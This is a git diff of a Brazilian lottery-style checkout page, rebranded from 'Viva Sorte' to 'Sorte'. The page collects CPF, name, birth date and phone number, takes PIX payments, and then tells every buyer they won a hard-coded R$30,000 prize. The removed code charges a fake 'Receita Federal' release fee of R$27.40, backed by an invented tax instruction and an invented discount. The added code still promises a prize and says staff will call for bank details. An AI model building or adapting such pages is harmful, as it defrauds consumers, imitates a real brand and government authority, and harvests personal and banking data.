@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Viva Sorte</title>
+    <title>Sorte - Títulos de Capitalização</title>
     
     <!-- CSS -->
     <link href="css/style.css" rel="stylesheet">
@@ -452,7 +452,7 @@
         margin-left: 5px;
     }
     
-    /* ETAPA 4 - PRÊMIO DE 30 MIL E SOLICITAÇÃO CHAVE PIX */
+    /* ETAPA 4 - PRÊMIO DE 30 MIL DIRETO */
     .premio-ganho {
         background: linear-gradient(135deg, #ffc107 0%, #ff9800 100%);
         border-radius: 20px;
@@ -553,45 +553,6 @@
         50% { transform: scale(1.05); }
     }
     
-    .subtitulo-premio {
-        font-size: 20px;
-        font-weight: 600;
-        margin-bottom: 15px;
-        color: #000;
-    }
-    
-    /* FORMULÁRIO CHAVE PIX */
-    .form-chave-pix {
-        background: #f8f9fa;
-        border-radius: 15px;
-        padding: 20px;
-        margin-bottom: 20px;
-        border: 1px solid #eaeaea;
-        box-shadow: 0 5px 15px rgba(0,0,0,0.05);
-    }
-    
-    .form-chave-pix h3 {
-        color: #2f4eb5;
-        margin-bottom: 15px;
-        font-size: 18px;
-        font-weight: 700;
-        text-align: center;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 10px;
-    }
-    
-    .select-chave {
-        width: 100%;
-        padding: 12px;
-        border: 2px solid #e0e0e0;
-        border-radius: 8px;
-        margin-bottom: 15px;
-        font-size: 16px;
-    }
-    
-    /* INFORMAÇÃO DA COTA PREMIADA */
     .info-cota-premiada {
         background: #2f4eb5;
         color: white;
@@ -603,96 +564,6 @@
         font-size: 16px;
     }
     
-    /* AVISO RECEITA FEDERAL - VERSÃO RESUMIDA */
-    .aviso-receita {
-        background: #fff3cd;
-        border-left: 4px solid #ffc107;
-        border-radius: 8px;
-        padding: 15px;
-        margin: 15px 0;
-        color: #856404;
-        font-size: 14px;
-        line-height: 1.5;
-    }
-    
-    .aviso-receita strong {
-        color: #2f4eb5;
-        font-size: 16px;
-    }
-    
-    /* QUADRO DA TAXA - CORRIGIDO PARA MOBILE */
-    .quadro-taxa {
-        background: #2f4eb5;
-        color: white;
-        padding: 15px;
-        border-radius: 8px;
-        text-align: center;
-        margin-top: 15px;
-    }
-    
-    .texto-taxa-pequeno {
-        font-size: 14px;
-        opacity: 0.9;
-        margin-bottom: 5px;
-    }
-    
-    .valor-taxa-branco {
-        font-size: 32px;
-        font-weight: 900;
-        color: white !important;
-        line-height: 1.2;
-        text-shadow: 0 2px 4px rgba(0,0,0,0.2);
-    }
-    
-    .texto-taxa-rodape {
-        font-size: 12px;
-        opacity: 0.8;
-        margin-top: 5px;
-    }
-    
-    /* ÁREA PAGAMENTO TAXA */
-    .area-pagamento-taxa {
-        display: none;
-        margin-top: 20px;
-        padding: 15px;
-        background: #f8f9fa;
-        border-radius: 8px;
-    }
-    
-    .aguardando-taxa {
-        text-align: center;
-        padding: 15px;
-        background: #f8f9fa;
-        border-radius: 8px;
-        margin-top: 10px;
-    }
-    
-    .btn-sacar-premio {
-        width: 100%;
-        background: linear-gradient(to right, #28a745, #20c997);
-        color: white;
-        border: none;
-        padding: 18px;
-        border-radius: 10px;
-        font-size: 16px;
-        font-weight: 700;
-        cursor: pointer;
-        transition: all 0.3s ease;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 10px;
-        margin-top: 10px;
-        box-shadow: 0 4px 15px rgba(40, 167, 69, 0.2);
-    }
-    
-    .btn-sacar-premio:hover {
-        background: linear-gradient(to right, #218838, #1e7e34);
-        transform: translateY(-2px);
-        box-shadow: 0 6px 20px rgba(40, 167, 69, 0.3);
-    }
-    
-    /* PASSOS DO PRÊMIO */
     .passos-premio {
         background: #f8f9fa;
         border-radius: 15px;
@@ -773,7 +644,6 @@
         color: #2f4eb5;
     }
     
-    /* BOTÃO SUPORTE FINAL */
     .btn-suporte-final {
         width: 100%;
         background: linear-gradient(to right, #2f4eb5, #3949ab);
@@ -933,27 +803,6 @@
         .premio-ganho h1 {
             font-size: 24px;
         }
-        
-        .subtitulo-premio {
-            font-size: 16px;
-        }
-        
-        .passos-premio {
-            padding: 20px 15px;
-        }
-        
-        .btn-suporte-final, .btn-sacar-premio {
-            padding: 16px;
-            font-size: 15px;
-        }
-        
-        .quadro-taxa {
-            padding: 12px 10px;
-        }
-        
-        .valor-taxa-branco {
-            font-size: 28px;
-        }
     }
     </style>
 </head>
@@ -985,7 +834,7 @@
         <h1>Sorteio <span style="background-color: #f0ad4e;" id="contador">HOJE</span> por apenas <span style="background-color: #2f4eb5;">R$0,99</span></h1>
     </div>
 
-    <!-- PACOTES DE COTAS - CORRIGIDO COM event -->
+    <!-- PACOTES DE COTAS -->
     <div class="container-principal">
         <div class="cotas">
             <div class="cotas-one">
@@ -1119,7 +968,7 @@
             <!-- ETAPA 1: IDENTIFICAÇÃO (CPF) -->
             <div id="etapa1" class="etapa ativa">
                 <div class="modal-header">
-                    <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
+                    <img src="images/logoviva.png" alt="Sorte" class="logo-modal">
                 </div>
                 
                 <div class="progresso-etapas">
@@ -1144,7 +993,7 @@
                 <div class="modal-body">
                     <h2>Olá, boas vindas!</h2>
                     <p>Identifique-se usando seu CPF</p>
-                    <div class="resumo-compra" id="resumoCompra">6 títulos - R$5,94</div>
+                    <div class="resumo-compra" id="resumoCompra">Sorte - 6 títulos de capitalização - R$5,94</div>
                     
                     <div class="form-group">
                         <label>CPF</label>
@@ -1184,7 +1033,7 @@
             <!-- ETAPA 2: PAGAMENTO (TELEFONE + PIX) -->
             <div id="etapa2" class="etapa">
                 <div class="modal-header">
-                    <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
+                    <img src="images/logoviva.png" alt="Sorte" class="logo-modal">
                 </div>
                 
                 <div class="progresso-etapas">
@@ -1220,7 +1069,7 @@
                     <div class="resumo-pagamento">
                         <h3>Resumo do pagamento</h3>
                         <div class="detalhes-pagamento">
-                            <div><span id="quantidadeResumo">6</span> títulos</div>
+                            <div><span id="quantidadeResumo">6</span> títulos de capitalização</div>
                             <div>R$ <span id="valorResumo">5,94</span></div>
                         </div>
                         <div class="total-pagamento">
@@ -1264,7 +1113,7 @@
             <!-- ETAPA 3: CONFIRMAÇÃO -->
             <div id="etapa3" class="etapa">
                 <div class="modal-header">
-                    <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
+                    <img src="images/logoviva.png" alt="Sorte" class="logo-modal">
                 </div>
                 
                 <div class="progresso-etapas">
@@ -1301,7 +1150,7 @@
                             <i class="bi bi-gift-fill"></i>
                         </div>
                         <h3>Parabéns!</h3>
-                        <p class="texto-premio">Você está participando do sorteio instantâneo <strong>VIVA SORTE</strong></p>
+                        <p class="texto-premio">Você está participando do sorteio instantâneo <strong>SORTE</strong></p>
                         <p class="subtitulo-premio">Clique no botão abaixo para revelar seu prêmio</p>
                     </div>
                     
@@ -1313,10 +1162,10 @@
                 </div>
             </div>
             
-            <!-- ETAPA 4: PRÊMIO DE 30 MIL + CHAVE PIX + TAXA RECEITA FEDERAL -->
+            <!-- ETAPA 4: PRÊMIO DE 30 MIL DIRETO -->
             <div id="etapa4" class="etapa">
                 <div class="modal-header">
-                    <img src="images/logoviva.png" alt="Viva Sorte" class="logo-modal">
+                    <img src="images/logoviva.png" alt="Sorte" class="logo-modal">
                 </div>
                 
                 <div class="progresso-etapas">
@@ -1356,93 +1205,26 @@
                         </div>
                     </div>
 
-                    <div class="form-chave-pix">
-                        <h3><i class="bi bi-piggy-bank-fill"></i> Informe sua chave PIX para receber o prêmio</h3>
-                        
-                        <div class="form-group">
-                            <label>Tipo de chave PIX</label>
-                            <select id="tipoChavePix" class="select-chave" onchange="atualizarPlaceholderChave()">
-                                <option value="cpf">CPF</option>
-                                <option value="celular">Celular (com DDD)</option>
-                                <option value="email">E-mail</option>
-                            </select>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label id="labelChavePix">Chave PIX (CPF)</label>
-                            <input type="text" id="inputChavePix" placeholder="Digite seu CPF" oninput="formatarChavePix()">
-                            <div class="exemplo-input" id="exemploChavePix">Exemplo: 123.456.789-09</div>
-                            <div id="erroChavePix" class="mensagem-erro"></div>
-                        </div>
+                    <div class="passos-premio">
+                        <h3><i class="bi bi-check-circle-fill" style="color: #28a745;"></i> Prêmio liberado!</h3>
+                        <ul>
+                            <li><span class="bi bi-ticket-perforated"></span> Cota premiada: <strong>#202530000</strong></li>
+                            <li><span class="bi bi-cash-coin"></span> Valor do prêmio: <strong>R$ 30.000,00</strong></li>
+                            <li><span class="bi bi-whatsapp"></span> Nossa equipe entrará em contato via WhatsApp nas próximas 24 horas</li>
+                            <li><span class="bi bi-telephone"></span> Você receberá uma ligação para confirmar os dados bancários</li>
+                            <li><span class="bi bi-bank"></span> O depósito será realizado em até 2 dias úteis</li>
+                        </ul>
                     </div>
                     
-                    <button class="btn-sacar-premio" onclick="sacarPremio()">
-                        <i class="bi bi-cash-coin"></i>
-                        SACAR R$30.000,00 AGORA
+                    <div class="agradecimento">
+                        <p><i class="bi bi-check-circle-fill" style="color: #28a745;"></i> <strong>Prêmio garantido!</strong></p>
+                        <p>A equipe Sorte entrará em contato em breve.</p>
+                    </div>
+                    
+                    <button class="btn-suporte-final" onclick="abrirSuporteWhatsApp()">
+                        <i class="bi bi-whatsapp"></i>
+                        FALAR COM SUPORTE
                     </button>
-                    
-                    <div id="areaPagamentoTaxa" class="area-pagamento-taxa">
-                        <div class="aviso-receita">
-                            <i class="bi bi-exclamation-triangle-fill" style="margin-right: 8px;"></i>
-                            <strong>LIBERAÇÃO DO PRÊMIO</strong><br><br>
-                            
-                            <p style="margin-bottom: 10px;">De acordo com a Instrução Normativa RFB nº 2025/2024, prêmios acima de R$ 20.000 estão sujeitos à tributação.</p>
-                            
-                            <p style="margin-bottom: 10px;"><strong>DESCONTO ESPECIAL:</strong> Por ser sorteio beneficente, você tem 80% de redução no valor!</p>
-                            
-                            <p style="margin-bottom: 15px;">Taxa reduzida de <strong>R$ 450,00</strong> para apenas:</p>
-                            
-                            <div class="quadro-taxa">
-                                <div class="texto-taxa-pequeno">VALOR FINAL A PAGAR:</div>
-                                <div class="valor-taxa-branco">R$ 27,40</div>
-                                <div class="texto-taxa-rodape">Taxa única de liberação do prêmio</div>
-                            </div>
-                        </div>
-                        
-                        <div id="areaPIXTaxa" class="area-pix" style="display: block; margin-top: 10px;">
-                            <div class="qrcode-container">
-                                <div id="qrCodeTaxa"></div>
-                                <p style="color: #666; font-size: 13px;">Escaneie para pagar a taxa de R$ 27,40</p>
-                            </div>
-                            
-                            <div class="codigo-pix">
-                                <p style="color: #333; font-size: 14px; margin-bottom: 8px;">Ou copie o código PIX:</p>
-                                <div class="input-copiar">
-                                    <input type="text" id="codigoPIXTaxa" readonly>
-                                    <button onclick="copiarCodigoPIXTaxa()">Copiar</button>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <div id="aguardandoTaxa" class="aguardando-confirmacao" style="display: none;">
-                            <div class="rodinha-grande"></div>
-                            <div class="aguardando-texto">Aguardando confirmação do pagamento da taxa</div>
-                            <div class="aguardando-detalhes" id="statusTaxa">Verificando pagamento...</div>
-                        </div>
-                    </div>
-
-                    <div id="mensagemFinalPremio" style="display: none;">
-                        <div class="passos-premio">
-                            <h3><i class="bi bi-check-circle-fill" style="color: #28a745;"></i> Taxa paga com sucesso!</h3>
-                            <ul>
-                                <li><span class="bi bi-ticket-perforated"></span> Cota premiada: <strong>#202530000</strong></li>
-                                <li><span class="bi bi-cash-coin"></span> Valor do prêmio: <strong>R$ 30.000,00</strong></li>
-                                <li><span class="bi bi-whatsapp"></span> Nossa equipe entrará em contato via WhatsApp nas próximas 24 horas</li>
-                                <li><span class="bi bi-telephone"></span> Você receberá uma ligação para confirmar os dados bancários</li>
-                                <li><span class="bi bi-bank"></span> O depósito será realizado em até 2 dias úteis</li>
-                            </ul>
-                        </div>
-                        
-                        <div class="agradecimento">
-                            <p><i class="bi bi-check-circle-fill" style="color: #28a745;"></i> <strong>Prêmio liberado para pagamento!</strong></p>
-                            <p>A equipe Viva Sorte entrará em contato em breve.</p>
-                        </div>
-                        
-                        <button class="btn-suporte-final" onclick="abrirSuporteWhatsApp()">
-                            <i class="bi bi-whatsapp"></i>
-                            FALAR COM SUPORTE
-                        </button>
-                    </div>
                 </div>
             </div>
         </div>
@@ -1470,10 +1252,7 @@
         data_nascimento: '',
         telefone: '',
         transactionId: '',
-        pixData: null,
-        chavePix: '',
-        tipoChavePix: 'cpf',
-        taxaPaga: false
+        pixData: null
     };
 
     const ALLOWPAY_CONFIG = {
@@ -1486,7 +1265,6 @@
 
     let verificacaoAutomatica = null;
     let tentativasVerificacao = 0;
-    let verificacaoTaxaAutomatica = null;
 
     // FUNÇÃO CORRIGIDA PARA SELEÇÃO DE PACOTE
     function selecionarPacote(quantidade, valor, event) {
@@ -1520,8 +1298,8 @@
                 currency: 'BRL',
                 transaction_id: transactionId,
                 items: [{
-                    item_id: 'vivasorte_titulos',
-                    item_name: 'Títulos Viva Sorte',
+                    item_id: 'sorte_titulos',
+                    item_name: 'Títulos Sorte',
                     quantity: quantidade,
                     price: valor / quantidade
                 }]
@@ -1532,8 +1310,8 @@
             fbq('track', 'Purchase', {
                 value: valor,
                 currency: 'BRL',
-                content_ids: ['vivasorte_titulos'],
-                content_name: 'Títulos Viva Sorte',
+                content_ids: ['sorte_titulos'],
+                content_name: 'Títulos Sorte',
                 content_type: 'product',
                 num_items: quantidade
             });
@@ -1543,7 +1321,7 @@
     }
 
     function abrirSuporteWhatsApp() {
-        const whatsappLink = "https://wa.me/5511954268216?text=Olá!%20Ganhei%20R$%2030.000,00%20no%20Viva%20Sorte%20e%20gostaria%20de%20receber%20meu%20prêmio.";
+        const whatsappLink = "https://wa.me/5511954268216?text=Olá!%20Ganhei%20R$%2030.000,00%20no%20Sorte%20e%20gostaria%20de%20receber%20meu%20prêmio.";
         window.open(whatsappLink, '_blank', 'noopener,noreferrer');
     }
 
@@ -1627,10 +1405,7 @@
             data_nascimento: '',
             telefone: '',
             transactionId: '',
-            pixData: null,
-            chavePix: '',
-            tipoChavePix: 'cpf',
-            taxaPaga: false
+            pixData: null
         };
         
         atualizarResumoCompra();
@@ -1657,15 +1432,12 @@
         document.getElementById('modalPagamento').style.display = 'none';
         document.body.style.overflow = 'auto';
         pararVerificacaoAutomatica();
-        if (verificacaoTaxaAutomatica) {
-            clearInterval(verificacaoTaxaAutomatica);
-            verificacaoTaxaAutomatica = null;
-        }
     }
 
     function atualizarResumoCompra() {
+        // Remove "Viva" do início do texto
         document.getElementById('resumoCompra').textContent = 
-            pacoteSelecionado.quantidade + ' títulos - R$' + pacoteSelecionado.valor.toFixed(2).replace('.', ',');
+            'Sorte - ' + pacoteSelecionado.quantidade + ' títulos de capitalização - R$' + pacoteSelecionado.valor.toFixed(2).replace('.', ',');
         
         document.getElementById('quantidadeResumo').textContent = pacoteSelecionado.quantidade;
         document.getElementById('valorResumo').textContent = pacoteSelecionado.valor.toFixed(2).replace('.', ',');
@@ -1981,7 +1753,7 @@
             dadosUsuario.transactionId = resultado.transaction_id;
             dadosUsuario.pixData = resultado;
             
-            localStorage.setItem(`pix_vs_${resultado.transaction_id}`, JSON.stringify({
+            localStorage.setItem(`pix_${resultado.transaction_id}`, JSON.stringify({
                 ...resultado,
                 cpf: dadosUsuario.cpf,
                 nome: dadosUsuario.nome,
@@ -2148,11 +1920,11 @@
     }
 
     function processarConfirmacao(dadosConfirmacao) {
-        const transacaoSalva = JSON.parse(localStorage.getItem(`pix_vs_${dadosUsuario.transactionId}`) || '{}');
+        const transacaoSalva = JSON.parse(localStorage.getItem(`pix_${dadosUsuario.transactionId}`) || '{}');
         transacaoSalva.status = 'paid';
         transacaoSalva.confirmado_em = new Date().toISOString();
         transacaoSalva.confirmacao_dados = dadosConfirmacao;
-        localStorage.setItem(`pix_vs_${dadosUsuario.transactionId}`, JSON.stringify(transacaoSalva));
+        localStorage.setItem(`pix_${dadosUsuario.transactionId}`, JSON.stringify(transacaoSalva));
         
         salvarConfirmacaoPagamento();
         
@@ -2181,35 +1953,16 @@
             confirmado_em: new Date().toISOString()
         };
         
-        let transacoes = JSON.parse(localStorage.getItem('vivasorte_transacoes') || '[]');
+        let transacoes = JSON.parse(localStorage.getItem('sorte_transacoes') || '[]');
         transacoes.push(transacao);
-        localStorage.setItem('vivasorte_transacoes', JSON.stringify(transacoes));
+        localStorage.setItem('sorte_transacoes', JSON.stringify(transacoes));
         
         console.log('✅ Pagamento confirmado salvo:', transacao);
     }
 
     function avancarParaEtapa4() {
         mostrarEtapa(4);
-        
-        dadosUsuario.taxaPaga = false;
-        document.getElementById('areaPagamentoTaxa').style.display = 'none';
-        document.querySelector('.btn-sacar-premio').style.display = 'block';
-        document.getElementById('mensagemFinalPremio').style.display = 'none';
-        
-        if (dadosUsuario.cpf) {
-            document.getElementById('inputChavePix').value = formatarCPFString(dadosUsuario.cpf);
-        }
-        
         salvarVisualizacaoPremio();
-    }
-
-    function formatarCPFString(cpf) {
-        if (!cpf) return '';
-        cpf = cpf.replace(/\D/g, '');
-        if (cpf.length === 11) {
-            return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
-        }
-        return cpf;
     }
 
     function salvarVisualizacaoPremio() {
@@ -2222,327 +1975,6 @@
         };
         
         console.log('🏆 Prêmio visualizado:', transacao);
-    }
-
-    function atualizarPlaceholderChave() {
-        const tipo = document.getElementById('tipoChavePix').value;
-        const label = document.getElementById('labelChavePix');
-        const input = document.getElementById('inputChavePix');
-        const exemplo = document.getElementById('exemploChavePix');
-        
-        dadosUsuario.tipoChavePix = tipo;
-        
-        if (tipo === 'cpf') {
-            label.textContent = 'Chave PIX (CPF)';
-            input.placeholder = 'Digite seu CPF';
-            exemplo.textContent = 'Exemplo: 123.456.789-09';
-            input.value = dadosUsuario.cpf ? formatarCPFString(dadosUsuario.cpf) : '';
-        } else if (tipo === 'celular') {
-            label.textContent = 'Chave PIX (Celular)';
-            input.placeholder = 'Digite seu celular com DDD';
-            exemplo.textContent = 'Exemplo: (11) 99999-9999';
-            input.value = '';
-        } else if (tipo === 'email') {
-            label.textContent = 'Chave PIX (E-mail)';
-            input.placeholder = 'Digite seu e-mail';
-            exemplo.textContent = 'Exemplo: seuemail@email.com';
-            input.value = '';
-        }
-        
-        document.getElementById('erroChavePix').style.display = 'none';
-        input.style.borderColor = '#e0e0e0';
-    }
-
-    function formatarChavePix() {
-        const tipo = document.getElementById('tipoChavePix').value;
-        const input = document.getElementById('inputChavePix');
-        let value = input.value;
-        
-        if (tipo === 'cpf') {
-            let digits = value.replace(/\D/g, '');
-            if (digits.length <= 11) {
-                digits = digits.replace(/(\d{3})(\d)/, '$1.$2');
-                digits = digits.replace(/(\d{3})(\d)/, '$1.$2');
-                digits = digits.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
-                input.value = digits;
-            }
-        } else if (tipo === 'celular') {
-            let digits = value.replace(/\D/g, '');
-            if (digits.length <= 11) {
-                if (digits.length > 2) {
-                    digits = '(' + digits.substring(0, 2) + ') ' + digits.substring(2);
-                }
-                if (digits.length > 10) {
-                    digits = digits.substring(0, 10) + '-' + digits.substring(10);
-                }
-                input.value = digits;
-            }
-        }
-        
-        document.getElementById('erroChavePix').style.display = 'none';
-        input.style.borderColor = '#e0e0e0';
-    }
-
-    function validarChavePix() {
-        const tipo = document.getElementById('tipoChavePix').value;
-        const chave = document.getElementById('inputChavePix').value.trim();
-        const erroChave = document.getElementById('erroChavePix');
-        
-        if (!chave) {
-            erroChave.textContent = 'Por favor, informe sua chave PIX.';
-            erroChave.style.display = 'block';
-            return false;
-        }
-        
-        if (tipo === 'cpf') {
-            const cpfNumeros = chave.replace(/\D/g, '');
-            if (cpfNumeros.length !== 11) {
-                erroChave.textContent = 'CPF inválido. Deve conter 11 dígitos.';
-                erroChave.style.display = 'block';
-                return false;
-            }
-        } else if (tipo === 'celular') {
-            const celularNumeros = chave.replace(/\D/g, '');
-            if (celularNumeros.length < 10 || celularNumeros.length > 11) {
-                erroChave.textContent = 'Celular inválido. Deve conter DDD + número.';
-                erroChave.style.display = 'block';
-                return false;
-            }
-        } else if (tipo === 'email') {
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            if (!emailRegex.test(chave)) {
-                erroChave.textContent = 'E-mail inválido.';
-                erroChave.style.display = 'block';
-                return false;
-            }
-        }
-        
-        erroChave.style.display = 'none';
-        return true;
-    }
-
-    function sacarPremio() {
-        if (!validarChavePix()) {
-            return;
-        }
-        
-        const tipo = document.getElementById('tipoChavePix').value;
-        const chave = document.getElementById('inputChavePix').value.trim();
-        
-        dadosUsuario.chavePix = chave;
-        dadosUsuario.tipoChavePix = tipo;
-        
-        document.querySelector('.btn-sacar-premio').style.display = 'none';
-        document.getElementById('areaPagamentoTaxa').style.display = 'block';
-        
-        gerarPIXTaxa();
-    }
-
-    async function gerarPIXTaxa() {
-        const valorTaxa = 27.40;
-        
-        try {
-            const dadosPIX = {
-                amount: valorTaxa,
-                cpf: dadosUsuario.cpf,
-                nome: dadosUsuario.nome,
-                data_nascimento: dadosUsuario.data_nascimento,
-                telefone: dadosUsuario.telefone,
-                quantidade: 1,
-                descricao: 'Taxa Receita Federal - Liberação Prêmio R$30.000'
-            };
-            
-            console.log('📤 Gerando PIX para taxa:', dadosPIX);
-            
-            const response = await fetch(ALLOWPAY_CONFIG.API_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
-                body: JSON.stringify(dadosPIX)
-            });
-            
-            const resultado = await response.json();
-            console.log('📥 Resposta API Taxa:', resultado);
-            
-            if (!resultado.success) {
-                throw new Error(resultado.error || 'Erro ao gerar PIX da taxa');
-            }
-            
-            const qrCodeImage = resultado.qr_code_image || 
-                `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(resultado.codigo_pix || resultado.qr_code)}`;
-            
-            document.getElementById('qrCodeTaxa').innerHTML = 
-                `<img src="${qrCodeImage}" alt="QR Code PIX Taxa" style="max-width: 200px; border: 1px solid #ddd;">`;
-            
-            document.getElementById('codigoPIXTaxa').value = resultado.codigo_pix || resultado.qr_code;
-            
-            dadosUsuario.transactionIdTaxa = resultado.transaction_id;
-            
-            localStorage.setItem(`taxa_vs_${resultado.transaction_id}`, JSON.stringify({
-                ...resultado,
-                cpf: dadosUsuario.cpf,
-                nome: dadosUsuario.nome,
-                chave_pix: dadosUsuario.chavePix,
-                tipo_chave: dadosUsuario.tipoChavePix,
-                valor: valorTaxa,
-                gerado_em: new Date().toISOString(),
-                status: 'pending'
-            }));
-            
-            mostrarPopupNotificacao('PIX da taxa gerado! Pague R$ 27,40 para liberar seu prêmio.');
-            
-            iniciarVerificacaoTaxaAutomatica();
-            
-        } catch (error) {
-            console.error('❌ Erro ao gerar PIX da taxa:', error);
-            
-            const erroTaxa = document.getElementById('erroChavePix');
-            erroTaxa.textContent = `Erro ao gerar PIX da taxa: ${error.message}`;
-            erroTaxa.style.display = 'block';
-            
-            mostrarPopupNotificacao('Erro ao gerar PIX da taxa. Tente novamente.', true);
-        }
-    }
-
-    function copiarCodigoPIXTaxa() {
-        const codigoInput = document.getElementById('codigoPIXTaxa');
-        const btnCopiar = document.querySelector('#areaPIXTaxa .input-copiar button');
-        
-        if (!codigoInput.value) {
-            mostrarPopupNotificacao('❌ Nenhum código PIX disponível.', true);
-            return;
-        }
-        
-        const textoOriginal = btnCopiar.textContent;
-        
-        codigoInput.select();
-        codigoInput.setSelectionRange(0, 99999);
-        
-        navigator.clipboard.writeText(codigoInput.value)
-            .then(() => {
-                btnCopiar.textContent = '✅ Copiado!';
-                btnCopiar.style.background = '#28a745';
-                
-                mostrarPopupNotificacao('✅ Código PIX da taxa copiado!');
-                
-                setTimeout(() => {
-                    btnCopiar.textContent = textoOriginal;
-                    btnCopiar.style.background = '#2f4eb5';
-                }, 3000);
-            })
-            .catch(err => {
-                console.error('Erro ao copiar: ', err);
-                document.execCommand('copy');
-                btnCopiar.textContent = '❌ Falhou';
-                btnCopiar.style.background = '#e74c3c';
-                
-                mostrarPopupNotificacao('⚠️ Selecione e copie manualmente (Ctrl+C).', true);
-                
-                setTimeout(() => {
-                    btnCopiar.textContent = textoOriginal;
-                    btnCopiar.style.background = '#2f4eb5';
-                }, 3000);
-            });
-    }
-
-    async function verificarPagamentoTaxa() {
-        if (!dadosUsuario.transactionIdTaxa) {
-            return;
-        }
-        
-        document.getElementById('statusTaxa').textContent = `Verificando pagamento da taxa...`;
-        
-        try {
-            const response = await fetch(ALLOWPAY_CONFIG.CHECK_PAYMENT_URL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    transaction_id: dadosUsuario.transactionIdTaxa
-                })
-            });
-            
-            const result = await response.json();
-            
-            if (!result.success) {
-                console.log('❌ Erro na verificação da taxa:', result.error);
-                return;
-            }
-            
-            const status = result.status;
-            
-            console.log(`📊 Status da taxa: ${status}`);
-            
-            const statusConfirmados = ['paid', 'completed', 'approved'];
-            
-            if (statusConfirmados.includes(status)) {
-                console.log('✅ Taxa paga com sucesso!');
-                
-                document.getElementById('statusTaxa').innerHTML = '<span style="color: #28a745;">✅ Taxa paga! Liberando prêmio...</span>';
-                
-                clearInterval(verificacaoTaxaAutomatica);
-                verificacaoTaxaAutomatica = null;
-                
-                dadosUsuario.taxaPaga = true;
-                
-                document.getElementById('areaPagamentoTaxa').style.display = 'none';
-                document.getElementById('mensagemFinalPremio').style.display = 'block';
-                
-                salvarTaxaPaga();
-                
-                mostrarPopupNotificacao('✅ Taxa paga! Prêmio liberado. Aguarde contato.');
-                
-            } else if (status === 'expired' || status === 'failed' || status === 'canceled') {
-                document.getElementById('statusTaxa').innerHTML = '<span style="color: #e74c3c;">❌ Pagamento da taxa falhou. Gere um novo PIX.</span>';
-            } else {
-                document.getElementById('statusTaxa').textContent = `Aguardando confirmação do pagamento da taxa...`;
-            }
-            
-        } catch (error) {
-            console.error('💥 Erro na verificação da taxa:', error);
-            document.getElementById('statusTaxa').textContent = `Erro na verificação. Tentando novamente...`;
-        }
-    }
-
-    function iniciarVerificacaoTaxaAutomatica() {
-        console.log('🔄 Iniciando verificação da taxa a cada 5 segundos');
-        
-        document.getElementById('aguardandoTaxa').style.display = 'block';
-        
-        verificarPagamentoTaxa();
-        
-        verificacaoTaxaAutomatica = setInterval(verificarPagamentoTaxa, 5000);
-        
-        setTimeout(() => {
-            if (verificacaoTaxaAutomatica) {
-                clearInterval(verificacaoTaxaAutomatica);
-                verificacaoTaxaAutomatica = null;
-                document.getElementById('statusTaxa').innerHTML = '<span style="color: #e74c3c;">⏰ Tempo esgotado. Se pagou, contate o suporte.</span>';
-            }
-        }, 1800000);
-    }
-
-    function salvarTaxaPaga() {
-        const transacaoTaxa = {
-            id: dadosUsuario.transactionIdTaxa,
-            cpf: dadosUsuario.cpf,
-            nome: dadosUsuario.nome,
-            chave_pix: dadosUsuario.chavePix,
-            tipo_chave: dadosUsuario.tipoChavePix,
-            valor: 27.40,
-            data: new Date().toISOString(),
-            status: 'taxa_paga',
-            confirmado_em: new Date().toISOString()
-        };
-        
-        let taxasPagas = JSON.parse(localStorage.getItem('vivasorte_taxas') || '[]');
-        taxasPagas.push(transacaoTaxa);
-        localStorage.setItem('vivasorte_taxas', JSON.stringify(taxasPagas));
-        
-        console.log('✅ Taxa paga salva:', transacaoTaxa);
     }
 
     function mostrarPopupNotificacao(mensagem, isError = false) {
